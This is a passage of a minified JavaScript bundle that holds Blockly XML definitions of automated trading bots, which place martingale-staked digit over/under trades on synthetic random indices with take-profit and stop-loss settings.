<block type="text_statement" id=";r@2EVAoArOmLKTRh!(B">\n                                    <value name="TEXT">\n                                      <shadow type="text" id="GF{HYmTt,p~jEUU9/H}e">\n                                        <field name="TEXT">Marvel Pro Inbuilt Wizard Running ...</field>\n                                      </shadow>\n                                    </value>\n                                    <next>\n                                      <block type="text_statement" id="D;h@$=ZN=CvIT02.Yph,">\n                                        <value name="TEXT">\n                                          <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="ETz.Rg.;vp6XbOmIZA*G">\n                                            <field name="TEXT">abc</field>\n                                          </shadow>\n                                          <block type="variables_get" id="|Dep(H,^PVNV{zIu9r0H">\n                                            <field name="VAR" id="1sRF8Ow=LBCxCjDWi$Th" variabletype="">Tick 3</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="text_statement" id="y@i/a@0sQ^EIxBwWW`{P">\n                                            <value name="TEXT">\n                                              <shadow type="text" id="]Da;8=B_Fi6fmcoh5#Ly">\n                                                <field name="TEXT">&gt;</field>\n                                              </shadow>\n                                            </value>\n                                            <next>\n                                              <block type="text_statement" id="=EU%-d}?m|JvsEw2#W1|">\n                                                <value name="TEXT">\n                                                  <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="ETz.Rg.;vp6XbOmIZA*G">\n                                                    <field name="TEXT">abc</field>\n                                                  </shadow>\n                                                  <block type="variables_get" id="}jA~A,*k-qN*SUo;6LxV">\n                                                    <field name="VAR" id="/.fQ=@I~l,Dz0|e2a)(n" variabletype="">Tick 2</field>\n                                                  </block>\n                                                </value>\n                                                <next>\n                                                  <block type="text_statement" id="b@_ms({;(S*q*4Bg@u1D">\n                                                    <value name="TEXT">\n                                                      <shadow type="text" id="?Kayw,81:HTu~p^iIyp.">\n                                                        <field name="TEXT">&gt;</field>\n                                                      </shadow>\n                                                    </value>\n                                                    <next>\n                                                      <block type="text_statement" id="55{Uj5yXk45;I)I0+IXj">\n                                                        <value name="TEXT">\n                                                          <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="ETz.Rg.;vp6XbOmIZA*G">\n                                                            <field name="TEXT">abc</field>\n                                                          </shadow>\n                                                          <block type="variables_get" id="|]=si5+@!)nt{yw779uB">\n                                                            <field name="VAR" id="!(f!MzWu/SJJ;NaP]=?!" variabletype="">Tick 1</field>\n                                                          </block>\n                                                        </value>\n                                                      </block>\n                                                    </next>\n                                                  </block>\n                                                </next>\n                                              </block>\n                                            </next>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </statement>\n                                <next>\n                                  <block type="notify" id="~TF7Tz)N0M.:O)?iQxzm">\n                                    <field name="NOTIFICATION_TYPE">success</field>\n                                    <field name="NOTIFICATION_SOUND">silent</field>\n                                    <value name="MESSAGE">\n                                      <shadow xmlns="https://developers.google.com/blockly/xml" type="text" id="lT:Q@9jwL4v5lq)}o?Id">\n                                        <field name="TEXT">abc</field>\n                                      </shadow>\n                                      <block type="variables_get" id="HH)w~E)X0([/7Xx.YLuL">\n                                        <field name="VAR" id="]_MS:$MrQakFy~dy[v}a" variabletype="">text</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n  </block>\n  <block type="procedures_defnoreturn" id="s;(z*=QRKMh5SJ%^p)^4" collapsed="true" x="0" y="1836">\n    <field name="NAME">Tyre</field>\n    <comment id="OJ[)2E[Sp7aI!=e2A._G" pinned="false" h="80" w="160" x="186" y="1844" minimized="false">Describe this function...</comment>\n    <statement name="STACK">\n      <block type="variables_set" id="{R_1SU`GtBzM?*-pJLM%">\n        <field name="VAR" id="Mbkib,V~cE~Q4]93TSDB" variabletype="">stake1</field>\n        <value name="VALUE">\n          <block type="variables_get" id="[9*Eqg(Sl7SZUb5C:}o:">\n            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            68507: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="7Q4y$nr_sr!x2NkOu%)2" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id=":Z8WvPXWG?qCe|8=iii1" islocal="false" iscloud="false">Expected Profit</variable>\n    <variable type="" id=":o#E4Mv[vmJES2fN=qo0" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="K`h}~iKgn?Z)RHYaKFfT" islocal="false" iscloud="false">Over Prediction</variable>\n    <variable type="" id="HyNhO~!rk1(6_u;tk|_i" islocal="false" iscloud="false">Trade Direction</variable>\n    <variable type="" id="@GRV-f=US~_%4pd.i}2Q" islocal="false" iscloud="false">Recovery Prediction</variable>\n    <variable type="" id="L.cN$B-UUzkS|eDQm2xZ" islocal="false" iscloud="false">Stop Loss</variable>\n    <variable type="" id="]_MS:$MrQakFy~dy[v}a" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="V3`ByiTyoj~_e_hJc;X=" islocal="false" iscloud="false">Stake1</variable>\n    <variable type="" id="uIhzq(Rnu7?ay*)Lax`q" islocal="false" iscloud="false">Loss</variable>\n    <variable type="" id="o#PtO)-%Wvm_=AQvH38N" islocal="false" iscloud="false">Martingale</variable>\n    <variable type="" id="*QheB|+}WKO9axF7.=VF" islocal="false" iscloud="false">item</variable>\n  </variables>\n  <block type="trade_definition" id="Trl.sJ3}+U,c~e-zFUy^" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="~=oeIoZ%WS/q]1NWBf;P" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">R_100</field>\n        <next>\n          <block type="trade_definition_tradetype" id="uT06=pes~zdz4ppk!7al" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="+:36ts]!!))@0zb2Cw?}" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="`-._(9_zhwbfP0b9+,d}" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="`/R47tY(;Ez%$vb[n+%*" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="wlGGC5P.p*4$V[]BL[iS" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="7sPy:Sl^ri)cRWQ=WuLm">\n        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n        <value name="VALUE">\n          <block type="math_number" id="qT87lDuK9}qjV+3;/[u6">\n            <field name="NUM">0.5</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="([}7^3RUy=3jxOMc^PNJ">\n            <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1" variabletype="">Expected Profit</field>\n            <value name="VALUE">\n              <block type="math_number" id="3N|+2I?dnv(B)ixf$S$l">\n                <field name="NUM">3</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="4Hj96![qXlxsC#x!b[~@">\n                <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ" variabletype="">Stop Loss</field>\n                <value name="VALUE">\n                  <block type="math_number" id="@.;$XBLeE~}}@:NV*!Fd">\n                    <field name="NUM">5</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="|aPCht%cR1;/{xBLPS3`">\n                    <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT" variabletype="">Over Prediction</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="q?286.t{mx:LnX9J5j[,">\n                        <field name="NUM">1</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="q~xXAN;4$!Df1QE4L}Xy">\n                        <field name="VAR" id="o#PtO)-%Wvm_=AQvH38N" variabletype="">Martingale</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="3zPF*3u^2%y2US,S#(+-">\n                            <field name="NUM">2</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="~(`[dsZp^m9FuqDydNz3">\n                            <field name="VAR" id="@GRV-f=US~_%4pd.i}2Q" variabletype="">Recovery Prediction</field>\n                            <value name="VALUE">\n                              <block type="math_number" id=":kdVhp0U=xE2ALN65?fz">\n                                <field name="NUM">4</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="a[z|?7iqhrS/.m(OR8L(">\n                                <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0" variabletype="">Prediction</field>\n                                <value name="VALUE">\n                                  <block type="variables_get" id="G:bSQLMo@(lMc^5Z(#QV">\n                                    <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT" variabletype="">Over Prediction</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="6Q](V?T%PKX8Rij[$j!S">\n                                    <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i" variabletype="">Trade Direction</field>\n                                    <value name="VALUE">\n                                      <block type="math_number" id="3oMHex_SyQHn=!2(5ozL">\n                                        <field name="NUM">1</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="variables_set" id="5su3#UL@)eb6lLGuQDEP">\n                                        <field name="VAR" id="V3`ByiTyoj~_e_hJc;X=" variabletype="">Stake1</field>\n                                        <value name="VALUE">\n                                          <block type="variables_get" id="zO+?wNO1(kSYgHW6u62U">\n                                            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="variables_set" id="de[MYEa/$F7nK7DB*5x/">\n                                            <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q" variabletype="">Loss</field>\n                                            <value name="VALUE">\n                                              <block type="math_number" id="?.AIBhG2,XPpW||t2]QG">\n                                                <field name="NUM">0</field>\n                                              </block>\n                                            </value>\n                                          </block>\n                                        </next>\n                                      </block>\n                                    </next>\n                                  </block>\n                                </next>\n                              </block>\n                            </next>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="SUBMARKET">\n      <block type="trade_definition_tradeoptions" id="{Dkfk~3kkr.wc8@{)~m0">\n        <mutation has_first_barrier="false" has_second_barrier="false" has_prediction="true"></mutation>\n        <field name="DURATIONTYPE_LIST">t</field>\n        <value name="DURATION">\n          <shadow type="math_number" id="%PF8u9|zX9*I{Sj|1VT@">\n            <field name="NUM">1</field>\n          </shadow>\n        </value>\n        <value name="AMOUNT">\n          <shadow type="math_number" id="TJ!MrnCmrS$Bx?A%Huu8">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="[=[~D]2jYL~/tc4OS]8/">\n            <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n          </block>\n        </value>\n        <value name="PREDICTION">\n          <shadow type="math_number_positive" id="ga#r[MayC#{{OWV|6z)g">\n            <field name="NUM">1</field>\n          </shadow>\n          <block type="variables_get" id="DR,CP(`,^*E0=DJ%4[ZZ">\n            <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0" variabletype="">Prediction</field>\n          </block>\n        </value>\n      </block>\n    </statement>\n  </block>\n  <block type="after_purchase" id="Q!WjmqV!JmoPK$1p=,Z`" x="957" y="60">\n    <statement name="AFTERPURCHASE_STACK">\n      <block type="controls_if" id=")DN{cw.=-)6[,2s01][y">\n        <mutation elseif="1" else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="_A{.]PjMZUh!;SaEL(PQ">\n            <field name="OP">GT</field>\n            <value name="A">\n              <block type="total_profit" id="kF8CU|)Q8);OEBV23B35"></block>\n            </value>\n            <value name="B">\n              <block type="variables_get" id="H6A]tIXPMPJiME$*UNm5">\n                <field name="VAR" id=":Z8WvPXWG?qCe|8=iii1" variabletype="">Expected Profit</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="text_join" id="_k:V[v`h|_I*K4:#)ubt">\n            <field name="VARIABLE" id="]_MS:$MrQakFy~dy[v}a" variabletype="">text</field>\n            <statement name="STACK">\n              <block type="text_statement" id="1g~?n9%iP08%^|a}^)D-">\n                <value name="TEXT">\n                  <shadow type="text" id="8x84,??pD;a}S^9Xe,fn">\n                    <field name="TEXT"></field>\n                  </shadow>\n                  <block type="text" id="#GiuOl|!IS#.dQ,z^u{[">\n                    <field name="TEXT">Congrats.  Take Profit hit \uD83D\uDC4D </field>\n                  </block>\n                </value>\n                <next>\n                  <block type="text_statement" id="Wzeq`?|_(.Zo(MF%PVUa">\n                    <value name="TEXT">\n                      <shadow type="text" id="}N!T)apd~+!_c/N8Si}1">\n                        <field name="TEXT"></field>\n                      </shadow>\n                      <block type="total_profit" id="{kIC:;hH!GMLK%hKOr-T"></block>\n                    </value>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="text_print" id="N(~vr~Hw#=;E6-FksizO">\n                <value name="TEXT">\n                  <shadow type="text" id="Bp6$(VRo#UxnC*1F~=(Y">\n                    <field name="TEXT">abc</field>\n                  </shadow>\n                  <block type="variables_get" id="#Nh0(1m^U=cv7LhiE+?x">\n                    <field name="VAR" id="]_MS:$MrQakFy~dy[v}a" variabletype="">text</field>\n                  </block>\n                </value>\n              </block>\n            </next>\n          </block>\n        </statement>\n        <value name="IF1">\n          <block type="logic_compare" id="smzONScgAqZX.OfS0Qdq">\n            <field name="OP">LTE</field>\n            <value name="A">\n              <block type="total_profit" id="W4`xJpW1oHU2|pLa=B|h"></block>\n            </value>\n            <value name="B">\n              <block type="math_single" id="w6?ckXU=)J*%XYM%{0_G">\n                <field name="OP">NEG</field>\n                <value name="NUM">\n                  <shadow type="math_number" id="3b0oN!UO@MweXR~8#$|1">\n                    <field name="NUM">9</field>\n                  </shadow>\n                  <block type="variables_get" id="jbl|7CC[=%~@(EO`#P@K">\n                    <field name="VAR" id="L.cN$B-UUzkS|eDQm2xZ" variabletype="">Stop Loss</field>\n                  </block>\n                </value>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO1">\n          <block type="text_print" id="X/MJb0Q;/=5axNI3uVKA">\n            <value name="TEXT">\n              <shadow type="text" id="W2[GJ[gjfV@JB:$(Y^8W">\n                <field name="TEXT">STOPLOSS HIT</field>\n              </shadow>\n            </value>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="controls_if" id="y|Maz[iF+,XXr*SS;dMc">\n            <mutation else="1"></mutation>\n            <value name="IF0">\n              <block type="contract_check_result" id="XV2Q0E0iQiX9MAc}Ef8A">\n                <field name="CHECK_RESULT">win</field>\n              </block>\n            </value>\n            <statement name="DO0">\n              <block type="variables_set" id="MrPv1PE+y[*~{SPeHB#v">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i" variabletype="">Trade Direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="tI[r?GR?Wxfy^NA|7i}t">\n                    <field name="NUM">1</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="#t])Wko5d{6r,!u8rN`2">\n                    <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0" variabletype="">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="z!x0@[~P}s`m{WK{O*N2">\n                        <field name="VAR" id="K`h}~iKgn?Z)RHYaKFfT" variabletype="">Over Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="H~1YIqKtXe3,ZmT@jw6+">\n                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                        <value name="VALUE">\n                          <block type="variables_get" id="VgEoCEi,e9l*VQ|#egF$">\n                            <field name="VAR" id="V3`ByiTyoj~_e_hJc;X=" variabletype="">Stake1</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="+|-b;cZbiZrCwLsK%A|7">\n                            <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q" variabletype="">Loss</field>\n                            <value name="VALUE">\n                              <block type="math_number" id="Vz/z)LkF9;{/EqO5FIqw">\n                                <field name="NUM">0</field>\n                              </block>\n                            </value>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <statement name="ELSE">\n              <block type="variables_set" id="N[OgR#+rozJPhhP1(mh`">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i" variabletype="">Trade Direction</field>\n                <value name="VALUE">\n                  <block type="math_number" id="+EOo1sB@OV5LoQ^i*~$E">\n                    <field name="NUM">0</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="KVy-mg|N+4p=z,p%L@*Q">\n                    <field name="VAR" id=":o#E4Mv[vmJES2fN=qo0" variabletype="">Prediction</field>\n                    <value name="VALUE">\n                      <block type="variables_get" id="+(V.|a~SZS3E%#i~/,=B">\n                        <field name="VAR" id="@GRV-f=US~_%4pd.i}2Q" variabletype="">Recovery Prediction</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="math_change" id="!-J0*a);qlq8P4ltOpUE">\n                        <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q" variabletype="">Loss</field>\n                        <value name="DELTA">\n                          <shadow type="math_number" id="SR%0!Cn9vDE3fHI)fP5:">\n                            <field name="NUM">1</field>\n                          </shadow>\n                        </value>\n                        <next>\n                          <block type="controls_if" id="yx`)8GK1%jmvlz55nup1">\n                            <value name="IF0">\n                              <block type="logic_compare" id="$T(%`!cQnm3~bCv65^QR">\n                                <field name="OP">GT</field>\n                                <value name="A">\n                                  <block type="variables_get" id="w#k/VfUHgsL*zWv(B{!r">\n                                    <field name="VAR" id="uIhzq(Rnu7?ay*)Lax`q" variabletype="">Loss</field>\n                                  </block>\n                                </value>\n                                <value name="B">\n                                  <block type="math_number" id="daKP^(/{WmC8@oAcGz[B">\n                                    <field name="NUM">1</field>\n                                  </block>\n                                </value>\n                              </block>\n                            </value>\n                            <statement name="DO0">\n                              <block type="variables_set" id="CCt@ERU+uVH`v5)M}s92">\n                                <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                                <value name="VALUE">\n                                  <block type="math_arithmetic" id="nE$E;oeO[:5eP81gCVzx">\n                                    <field name="OP">MULTIPLY</field>\n                                    <value name="A">\n                                      <shadow type="math_number" id="uCEY}eO{3bo*pd1^yxV/">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="variables_get" id="=E0V(n6.B}uGLvO{8aVu">\n                                        <field name="VAR" id="7Q4y$nr_sr!x2NkOu%)2" variabletype="">Stake</field>\n                                      </block>\n                                    </value>\n                                    <value name="B">\n                                      <shadow type="math_number" id=",Jv`wG=Z}(v0Hh2=[2D0">\n                                        <field name="NUM">1</field>\n                                      </shadow>\n                                      <block type="variables_get" id="6Idb0BT$y.?f:#+v72{_">\n                                        <field name="VAR" id="o#PtO)-%Wvm_=AQvH38N" variabletype="">Martingale</field>\n                                      </block>\n                                    </value>\n                                  </block>\n                                </value>\n                              </block>\n                            </statement>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </statement>\n            <next>\n              <block type="trade_again" id="dX9#uq8!`~,W]rcu15[e"></block>\n            </next>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n  <block type="before_purchase" id="Gs}:IU2/fgSK=gw}wEzj" deletable="false" x="0" y="1092">\n    <statement name="BEFOREPURCHASE_STACK">\n      <block type="controls_if" id="{JUMUeN0qE_yhh6o;bv`">\n        <mutation else="1"></mutation>\n        <value name="IF0">\n          <block type="logic_compare" id="9Krsro|CE%1!_``.zV12">\n            <field name="OP">EQ</field>\n            <value name="A">\n              <block type="variables_get" id=")o9})(W{{X9?{Qm}|_(:">\n                <field name="VAR" id="HyNhO~!rk1(6_u;tk|_i" variabletype="">Trade Direction</field>\n              </block>\n            </value>\n            <value name="B">\n              <block type="math_number" id="w~V@Nr1{v3e)AO4}T+VU">\n                <field name="NUM">1</field>\n              </block>\n            </value>\n          </block>\n        </value>\n        <statement name="DO0">\n          <block type="apollo_purchase" id="4oUF0V`vAb?3~p;(}guu">\n            <field name="PURCHASE_LIST">DIGITOVER</field>\n          </block>\n        </statement>\n        <statement name="ELSE">\n          <block type="apollo_purchase" id="ws]_ha)nio4mZUG4NH[d">\n            <field name="PURCHASE_LIST">DIGITOVER</field>\n          </block>\n        </statement>\n      </block>\n    </statement>\n  </block>\n</xml>'
            },
            51551: function(e, t, n) {
                "use strict";
                n.r(t), n.d(t, {
                    default: function() {
                        return a
                    }
                });
                let a = '<xml xmlns="http://www.w3.org/1999/xhtml" is_dbot="true" collection="false">\n  <variables>\n    <variable type="" id="VLBj7P@:FqNy~,R[c9Hp" islocal="false" iscloud="false">Prediction</variable>\n    <variable type="" id="}4sS3G-ig-*lgLxN.HK~" islocal="false" iscloud="false">Entry Point</variable>\n    <variable type="" id="r3#,*L{|k_*_oikco?~E" islocal="false" iscloud="false">Stake</variable>\n    <variable type="" id="Qq28jzu{61V^?3_DKY1z" islocal="false" iscloud="false">text</variable>\n    <variable type="" id="!(67Y!ov*~[U/$pjZ,0." islocal="false" iscloud="false">Stake win</variable>\n    <variable type="" id="x4khAyN_n|huu=qVhBFG" islocal="false" iscloud="false">item</variable>\n    <variable type="" id="Z@.ow_sBjxwtbL$F52.u" islocal="false" iscloud="false">Martingale</variable>\n    <variable type="" id="_$b#PTe$SH2iW}Unna2W" islocal="false" iscloud="false">Use Martingale</variable>\n    <variable type="" id="iexW!(p-QSL[kDvWK`o-" islocal="false" iscloud="false">Take Profit</variable>\n    <variable type="" id="AwGIX3K`=6@AOl/-`G)O" islocal="false" iscloud="false">Stop Loss</variable>\n    <variable type="" id="tpKgmnH0mz*.t/T=*i|V" islocal="false" iscloud="false">Maximum Runs</variable>\n    <variable type="" id="XfX?ed24Y,S7*f=/-sQ9" islocal="false" iscloud="false">Use Compounding Stake</variable>\n    <variable type="" id="@VN/)JBDaz5d-aHKEiy:" islocal="false" iscloud="false">Switch Markets</variable>\n    <variable type="" id="Vd)a}rnFL$Mr`V[FG0ZX" islocal="false" iscloud="false">Count</variable>\n    <variable type="" id=":,%~KY@s+t4t[x%D|Rs`" islocal="false" iscloud="false">Set Maximum Runs</variable>\n    <variable type="" id="nL}rZqx,y/BJNYaP$b:T" islocal="false" iscloud="false">Next trade</variable>\n    <variable type="" id="*--].`DnOHQt$4)m~g4q" islocal="false" iscloud="false">Over 0</variable>\n    <variable type="" id="AH3o]/[Il4Vqah/Cpy%5" islocal="false" iscloud="false">Under 9</variable>\n    <variable type="" id="kv1LrCbomC4@7:M/d%?0" islocal="false" iscloud="false">Use Contract Type Switcher</variable>\n    <variable type="" id="EyYZFSoOM?_MS_~x:Z^(" islocal="false" iscloud="false">Stop Trading on loss</variable>\n    <variable type="" id="l~5h|:Ld!GjDd-Ed4c|j" islocal="false" iscloud="false">Split Martingale</variable>\n    <variable type="" id="S58/v7q-;.szsCzu^Vvo" islocal="false" iscloud="false">Total Lost</variable>\n    <variable type="" id="ITcU7:kSbe)cNBWn8K#R" islocal="false" iscloud="false">Count Loss</variable>\n  </variables>\n  <block type="trade_definition" id="Dn+|l@F{1c%e:[S_b*y+" deletable="false" x="0" y="60">\n    <statement name="TRADE_OPTIONS">\n      <block type="trade_definition_market" id="?%-k%1.^XwP?^NTZ,Yt%" deletable="false" movable="false">\n        <field name="MARKET_LIST">synthetic_index</field>\n        <field name="SUBMARKET_LIST">random_index</field>\n        <field name="SYMBOL_LIST">1HZ10V</field>\n        <next>\n          <block type="trade_definition_tradetype" id="Ny,T+]j~q=euwb2^Hkrt" deletable="false" movable="false">\n            <field name="TRADETYPECAT_LIST">digits</field>\n            <field name="TRADETYPE_LIST">overunder</field>\n            <next>\n              <block type="trade_definition_contracttype" id="9KwoosLzczeC~F:5~JTl" deletable="false" movable="false">\n                <field name="TYPE_LIST">both</field>\n                <next>\n                  <block type="trade_definition_candleinterval" id="YCRtYsVDuvI2m(|Sn=oN" deletable="false" movable="false">\n                    <field name="CANDLEINTERVAL_LIST">60</field>\n                    <next>\n                      <block type="trade_definition_restartbuysell" id="5Nn9BCfR{SxZMWof=~U6" deletable="false" movable="false">\n                        <field name="TIME_MACHINE_ENABLED">FALSE</field>\n                        <next>\n                          <block type="trade_definition_restartonerror" id="$w}(v#RJo+GTV~6N#rJ(" deletable="false" movable="false">\n                            <field name="RESTARTONERROR">TRUE</field>\n                          </block>\n                        </next>\n                      </block>\n                    </next>\n                  </block>\n                </next>\n              </block>\n            </next>\n          </block>\n        </next>\n      </block>\n    </statement>\n    <statement name="INITIALIZATION">\n      <block type="variables_set" id="VtinTUlRho|l^-0R$7%A">\n        <field name="VAR" id="r3#,*L{|k_*_oikco?~E" variabletype="">Stake</field>\n        <value name="VALUE">\n          <block type="math_number" id="eE1:{)l/a]lYGgEq(xNf">\n            <field name="NUM">0.5</field>\n          </block>\n        </value>\n        <next>\n          <block type="variables_set" id="yuTs63H@^mt2$7WA8MM#">\n            <field name="VAR" id="iexW!(p-QSL[kDvWK`o-" variabletype="">Take Profit</field>\n            <value name="VALUE">\n              <block type="math_number" id="Ze7;s[0;Nz2%O4S_83gA">\n                <field name="NUM">5</field>\n              </block>\n            </value>\n            <next>\n              <block type="variables_set" id="nGr}CP0n6hP98*@D%p1~">\n                <field name="VAR" id="AwGIX3K`=6@AOl/-`G)O" variabletype="">Stop Loss</field>\n                <value name="VALUE">\n                  <block type="math_number" id="CNwP055C@dZ]pl;V~^@e">\n                    <field name="NUM">30</field>\n                  </block>\n                </value>\n                <next>\n                  <block type="variables_set" id="OsGf7Gg0%Bcr(O%2{xCZ">\n                    <field name="VAR" id="Z@.ow_sBjxwtbL$F52.u" variabletype="">Martingale</field>\n                    <value name="VALUE">\n                      <block type="math_number" id="A:w{a,.n|YO,bwZCpH[w">\n                        <field name="NUM">5</field>\n                      </block>\n                    </value>\n                    <next>\n                      <block type="variables_set" id="Fcha%$)MM1=st4QxHsPh">\n                        <field name="VAR" id="l~5h|:Ld!GjDd-Ed4c|j" variabletype="">Split Martingale</field>\n                        <value name="VALUE">\n                          <block type="math_number" id="w@@2WKObPu=S1+/hIiMF">\n                            <field name="NUM">3</field>\n                          </block>\n                        </value>\n                        <next>\n                          <block type="variables_set" id="l!28PD.;#a94j}-Zny(w">\n                            <field name="VAR" id="_$b#PTe$SH2iW}Unna2W" variabletype="">Use Martingale</field>\n                            <value name="VALUE">\n                              <block type="logic_boolean" id="yGRw;hhT=8$k[bq6[a5v">\n                                <field name="BOOL">TRUE</field>\n                              </block>\n                            </value>\n                            <next>\n                              <block type="variables_set" id="if+z)P.pg^EiMjJbZURL">\n                                <field name="VAR" id="XfX?ed24Y,S7*f=/-sQ9" variabletype="">Use Compounding Stake</field>\n                                <value name="VALUE">\n                                  <block type="logic_boolean" id="#q7dU*x-S3?p7GPK0lX)">\n                                    <field name="BOOL">FALSE</field>\n                                  </block>\n                                </value>\n                                <next>\n                                  <block type="variables_set" id="I-tw}E3wa6t2?-7un5%W">\n                                    <field name="VAR" id="@VN/)JBDaz5d-aHKEiy:" variabletype="">Switch Markets</field>\n                                    <value name="VALUE">\n                                      <block type="logic_boolean" id="nEAPjl%ws7=.-TTk$d5j">\n                                        <field name="BOOL">TRUE</field>\n                                      </block>\n                                    </value>\n                                    <next>\n                                      <block type="variables_set" id="Eu_!a.GW35dfWcQJT{Vo">\n                                        <field name="VAR" id=":,%~KY@s+t4t[x%D|Rs`" variabletype="">Set Maximum Runs</field>\n                                        <value name="VALUE">\n                                          <block type="logic_boolean" id="/bG]-A`uutQSD($fK!W*">\n                                            <field name="BOOL">FALSE</field>\n                                          </block>\n                                        </value>\n                                        <next>\n                                          <block type="variables_set" id="3ry|G9dufBVWni)wW5~^">\n                                            <field name="VAR" id="kv1LrCbomC4@7:M/d%?0" variabletype="">Use Contract Type Switcher</field>\n                                            <value name="VALUE">\n                                              <block type="logic_boolean" id="S]DG$Gq*/`RUC]^?l6W1">\n                                                <field name="BOOL">TRUE</field>\n                                              </block>\n                                            </value>\n                                            <next>\n                                              <block type="variables_set" id="+|3)-`f/qVr`m0B0;z(d">\n                                                <field name="VAR" id="EyYZFSoOM?_MS_~x:Z^(" variabletype="">Stop Trading on loss</field>\n                                                <value name="VALUE">\n                                                  <block type="logic_boolean" id="HL_;+VpMGGdymGC[NN%7">\n                                                    <field name="BOOL">FALSE</field>\n                                                  </block>\n                                                </value>\n                                                <next>\n                                                  <block type="variables_set" id="cDt^{%2b6}0F^KwAWoZ|" collapsed="true">\n                                                    <field name="VAR" id="nL}rZqx,y/BJNYaP$b:T" variabletype="">Next trade</field>\n                                                    <value name="VALUE">\n                                                      <block type="text" id="7-dU{:DF[`~${DPrwRqd">\n                                                        <field name="TEXT">Under</field>\n                                                      </block>\n                                                    </value>\n                                                    <next>\n                                                      <block type="procedures_callnoreturn" id="n5,AF[HWnBb[AxF:2sMU">\n                                                        <mutation name="Prevent Over 